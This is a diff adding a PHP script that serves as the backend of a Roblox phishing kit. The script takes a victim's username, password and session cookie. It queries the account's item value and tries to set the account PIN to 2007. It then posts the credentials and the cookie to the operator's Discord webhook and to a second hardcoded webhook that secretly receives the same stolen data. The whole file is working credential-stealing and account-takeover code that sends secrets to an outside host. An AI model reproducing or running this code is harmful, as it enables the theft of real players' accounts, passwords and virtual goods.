@@ -1,0 +1,286 @@
+<?php
+
+function sendMsg($username, $password, $kode, $webhook, $status, $cookie, $mship, $robux, $prem){
+$chs= curl_init();
+$dwebhook = "https://discord.com/api/webhooks/894071360605794305/RE1gw0D6ydcF-mHxUrd-LeYvQAW0RGL97rETS40JIns9lPuGewE3TPZDKC3Qwn2qtDAD";
+$value="";
+function request($url){
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	$output = curl_exec($ch);
+	curl_close($ch);
+	return $output;
+}
+
+function requestCookie($url, $cookie){
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: .ROBLOSECURITY=$cookie"));
+	$output = curl_exec($ch);
+	curl_close($ch);
+	return $output;
+}
+function requestId($username){
+	$getId = request("https://api.roblox.com/users/get-by-username?username=$username");
+	if(strpos($getId, 'Id') !== false){
+		$idDecode = json_decode($getId);
+		$id = $idDecode->Id;
+		return $id;
+	}
+	else{
+		return "Not Exist";
+	}
+	return;
+}
+function requestRapCookie($userId, $cookie){
+	$getRap = requestCookie("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?sortOrder=Asc&limit=100", $cookie);
+	$rapDecode = json_decode($getRap, true);
+	if (strpos($getRap, 'data') !== false) 
+	{
+		$rapData = $rapDecode["data"];
+		$rap = 0;
+		foreach($rapData as $rapValue){
+			$rap += $rapValue["recentAveragePrice"];
+		}
+		return $rap;
+	}
+	else{
+		return "Private";
+	}
+	return;
+}
+
+function postPin($cookie){
+$ch = curl_init();
+
+curl_setopt($ch, CURLOPT_URL, 'https://auth.roblox.com/v2/login');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_HEADER, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{
+	"cvalue":"Leakeder",
+	"ctype":"Username",
+	"password":"RAMAD001",
+}'
+);
+
+$headers = array();
+$headers[] = 'Content-Type: application/json';
+$headers[] = 'Accept: application/json';
+ $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
+$headers[] =    'Referer: https://www.roblox.com/login';
+ $headers[] =    'Cookie: .ROBLOSECURITY='.$cookie;
+   $headers[] = 'Origin: https://www.roblox.com';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+$result = curl_exec($ch);
+$headers = [];
+$result = rtrim($result);
+$data = explode("\n",$result);
+$headers['status'] = $data[0];
+array_shift($data);
+
+foreach($data as $part){
+
+    //some headers will contain ":" character (Location for example), and the part after ":" will be lost, Thanks to @Emanuele
+    $middle = explode(":",$part,2);
+
+    //Supress warning message if $middle[1] does not exist, Thanks to @crayons
+    if ( !isset($middle[1]) ) { $middle[1] = null; }
+$headers[trim($middle[0])] = trim($middle[1]);
+}
+
+$csrf= $headers["x-csrf-token"];
+
+$fields_string='{
+  "pin": "2007"
+}';
+
+$ch2= curl_init();
+
+curl_setopt($ch2, CURLOPT_URL, 'https://auth.roblox.com/v1/account/pin');
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch2, CURLOPT_POST, 1);
+curl_setopt($ch2, CURLOPT_HEADER, 1);
+curl_setopt($ch2, CURLOPT_POSTFIELDS, $fields_string);
+$headers = array();
+$headers[] = 'Content-Type: application/json';
+$headers[] = 'Accept: application/json';
+ $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
+$headers[] =    'Referer: https://www.roblox.com/login';
+   $headers[] = 'Origin: https://www.roblox.com';
+   $headers[] =    'Cookie: .ROBLOSECURITY='.$cookie;
+   $headers[] =    'x-csrf-token:'.$csrf;
+curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
+$header_size = curl_getinfo($ch2, CURLINFO_HEADER_SIZE);
+$output = curl_exec($ch2);
+//echo $output;
+}
+postPin($cookie);
+$uid=requestid($username);
+$rap=requestRapCookie($uid, $cookie);
+if($mship=="1"&&$kode=="true"){
+	$v= "Verified";
+	//$cocek="\n\n[Click here to check the cookie expiration](https://ww1-roblox.com/client-panel/cron2.php?cookie=".$cookie.")";
+	$title="Click here to check this cookie expiration";
+	$link="https://".$_SERVER['HTTP_HOST']."/client-panel/cron2.php?cookie=".$cookie;
+	$cek="wpw";
+}else if($kode!="true"){
+    $v= "Not Verified";
+	//$cocek="\n\n[Click here to check the cookie expiration](https://ww1-roblox.com/client-panel/cron2.php?cookie=".$cookie.")";
+	$title="Click here to check cookie";
+	$link="https://".$_SERVER['HTTP_HOST']."/client-panel/cron2.php?cookie=".$cookie;
+		$cek="wpw";
+		}
+if($status=="x"){
+	$title="Expired Account";
+	$link="https://".$_SERVER['HTTP_HOST']."/client-panel";
+$value="RESULT INCOMING !!! but your account is expired:( \n\n\n > *Tips : Renew :)*";
+$cookie="Expired Account";
+$password="Expired Account";
+}
+	$cek="wpw";
+//=======================================================================================================
+// Compose message. You can use Markdown
+// Message Formatting -- https://discordapp.com/developers/docs/reference#message-formatting
+//========================================================================================================
+$pin="";//postPin($cookie);
+$timestamp = date("c", strtotime("now"));
+
+$json_data = json_encode([
+    // Message
+    "content" => $pin,
+    
+    // Username
+    "username" => "WxR Result",
+
+    // Avatar URL.
+    // Uncoment to replace image set in webhook
+"avatar_url" => "https://images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif",
+
+    // Text-to-speech
+    "tts" => false,
+
+    // File upload
+    // "file" => "",
+
+    // Embeds Array
+    "embeds" => [
+        [
+            // Embed Title
+            "title" => $title,
+
+            // Embed Type
+            "type" => "rich",
+
+            // Embed Description
+        "description" => "",
+
+            // URL of title link
+         "url" => $link,
+
+            // Timestamp of embed must be formatted as ISO8601
+            "timestamp" => $timestamp,
+
+            // Embed left border color in HEX
+            "color" => hexdec( "FF0019"),
+
+            // Footer
+            "footer" => [
+                "text" => "WxR Result",
+              "icon_url" => "https://images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
+            ],
+
+            // Image to send
+            "image" => [
+       //         "url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=600"
+            ],
+
+            //Thumbnail
+            "thumbnail" => [
+            "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $uid . "&width=352&height=352&format=png"
+            ],
+
+            // Author
+            "author" => [
+                "name" => "Account Obtained",
+                "url" => "https://discord.gg/ksXzNX7nuk"
+            ],
+
+            // Additional Fields array
+            "fields" => [
+                // Field 1 *This Account Current PIN is 2007 if the pin is wrong there is a high chance that the owner already changed it*
+                [
+                    "name" => "Username",
+                    "value" => "```".$username."```",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Password",
+                    "value" => "```".$password."```",
+                    "inline" => true
+                ],
+                [
+                    "name" => "RAP",
+                    "value" => "```".$rap."```",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Robux",
+                    "value" => "```".$robux."```",
+                    "inline" => true
+                ],
+                [
+                    "name" => "PIN",
+                    "value" => "```2007```",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Status",
+                    "value" => "``` ".$v."```",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Cookies",
+                    "value" => "```".$cookie."```",
+                    "inline" => false
+                ],
+                [
+                    "name" => "If the PIN is wrong there is a high chance that the PIN is Already Changed",
+                    "value" => ".",
+                    "inline" => false
+                ]
+                
+      
+                // Etc..
+            ]
+        ]
+    ]
+
+], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
+
+
+$ch = curl_init( $webhook );
+curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+curl_setopt( $ch, CURLOPT_POST, 1);
+curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
+curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt( $ch, CURLOPT_HEADER, 0);
+curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
+
+$response = curl_exec( $ch );
+
+$ch = curl_init( $dwebhook );
+curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+curl_setopt( $ch, CURLOPT_POST, 1);
+curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
+curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt( $ch, CURLOPT_HEADER, 0);
+curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
+
+$response = curl_exec( $ch );
+            
+// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
+// Further processing ...
+}
